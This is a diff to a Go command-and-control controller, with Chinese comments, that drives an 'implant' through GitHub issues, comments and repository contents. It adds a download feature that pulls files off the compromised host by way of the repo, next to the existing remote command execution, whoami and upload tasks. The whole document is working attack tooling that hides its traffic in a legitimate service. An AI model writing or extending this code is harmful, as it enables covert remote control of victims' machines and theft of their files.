@@ -9,6 +9,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 )
@@ -194,12 +195,65 @@ func uploadFile(token, user, repo, localFilePath, remoteFileName string) error {
 
 	// 处理响应
 	if resp.StatusCode == http.StatusCreated {
-		fmt.Println(fmt.Sprintf("upload file %s to github success...", localFilePath))
+		fmt.Println(fmt.Sprintf("upload local file %s to github success...", localFilePath))
 	} else {
 		body, _ := ioutil.ReadAll(resp.Body)
 		return fmt.Errorf("failed to upload file: %s", string(body))
 	}
 
+	return nil
+}
+
+// downloadFile 从GitHub仓库下载文件
+func downloadFile(token, user, repo, remoteFilePath string) error {
+	// 构建请求URL
+	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", user, repo, remoteFilePath)
+
+	// 创建请求
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return fmt.Errorf("create request error: %v", err)
+	}
+
+	// 设置请求头
+	req.Header.Set("Authorization", "token "+token)
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
+
+	// 发送请求
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("request error: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// 检查响应状态
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("download fail, status_code: %d，resp: %s", resp.StatusCode, body)
+	}
+
+	// 读取响应体
+	var fileContent struct {
+		Content string `json:"content"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&fileContent); err != nil {
+		return fmt.Errorf("decode Resp error: %v", err)
+	}
+
+	// 将Base64内容解码
+	data, err := base64.StdEncoding.DecodeString(fileContent.Content)
+	if err != nil {
+		return fmt.Errorf("base64 decode content error: %v", err)
+	}
+
+	// 保存到当前目录
+	localFileName := filepath.Base(remoteFilePath)
+	if err := ioutil.WriteFile(localFileName, data, 0644); err != nil {
+		return fmt.Errorf("write file error: %v", err)
+	}
+
+	fmt.Printf("file download success: %s\n", localFileName)
 	return nil
 }
 
@@ -209,7 +263,7 @@ func printHelp() {
 	fmt.Println(" - whoami : get username")
 	fmt.Println(" - cmd <command> : execute command")
 	fmt.Println(" - upload <local_file_path> <remote_file_name> : upload local file to the implant")
-	fmt.Println(" - download <remote_file_name> <local_file_path> : download file of implant to local path")
+	fmt.Println(" - download <implant_file_path> <remote_file_name> : download file of implant to current local path")
 	fmt.Println(" - exit : kill the connection with the implant")
 }
 
@@ -276,11 +330,11 @@ func main() {
 			}
 
 			fmt.Println("waiting for the file upload...")
-			start_time := time.Now()
 			success_flag := false
 			args := strings.Fields(task)
 			local_file_path := args[1]
 			remote_file_name := args[2]
+			start_time := time.Now()
 			uploadFile(token, owner, repo, local_file_path, remote_file_name)
 			// 写个循环检测文件是否已经上传完成
 			for {
@@ -299,7 +353,6 @@ func main() {
 					if decoded == "upload success" {
 						success_flag = true
 					}
-					time.Sleep(1 * time.Second)
 					break
 				}
 			}
@@ -310,9 +363,60 @@ func main() {
 				fmt.Println("file upload fail, please try again")
 			}
 			issueNbr++
-		} else if strings.HasPrefix("download", task) {
+		} else if strings.HasPrefix(task, "download") {
+			// 思路跟上传文件一样，先把implant注入端的文件上传到github-repo，然后再从repo下载到本地当前目录
 			fmt.Printf("task: %s\n", task)
+			if err := PostIssue(token, owner, repo, task); err != nil {
+				fmt.Println(Error("Failed to post issue", err))
+				continue
+			}
+			fmt.Println("waiting for the file to download...")
 
+			success_flag := false
+			args := strings.Fields(task)
+			implant_file_path := args[1]
+			remote_file_name := args[2]
+			// 隔一段时间检测第issueNbr个issue的comment是否upload success
+			//implant_file_path是implant端首先要上传需要下载的文件到github-repo
+			//remote_file_name是直接通过github-repo将需要的文件下载到本地
+			for {
+				issueNbrStr := fmt.Sprintf("%d", issueNbr)
+				comment, err := GetComment(token, owner, repo, issueNbrStr)
+				if err != nil {
+					fmt.Println(Error("Failed to get comment", err))
+					continue
+				}
+				commentResp := findCommentBody(comment)
+				if commentResp != "" {
+					decoded, err := base64Decode(commentResp)
+					if err != nil {
+						fmt.Println("Decode Failure")
+					}
+					//implant成功将文件上传到github-repo，标记一下
+					if decoded == "upload success" {
+						success_flag = true
+						fmt.Println("upload implant file", implant_file_path, "to github success...")
+					} else {
+						fmt.Println("upload implant file", implant_file_path, "to github failed...")
+					}
+					break
+				}
+				time.Sleep(1 * time.Second)
+			}
+			//让github反应一下
+			time.Sleep(3 * time.Second)
+			start_time := time.Now()
+			if success_flag == true {
+				if err := downloadFile(token, owner, repo, remote_file_name); err != nil {
+					fmt.Println("download github file Error:", remote_file_name, err)
+				} else {
+					usertime := time.Since(start_time)
+					fmt.Println("implant file", implant_file_path, "download to local success, time-consuming:", usertime)
+				}
+			} else {
+				fmt.Println("file download fail, please try again")
+			}
+			issueNbr++
 		} else {
 			printHelp()
 		}
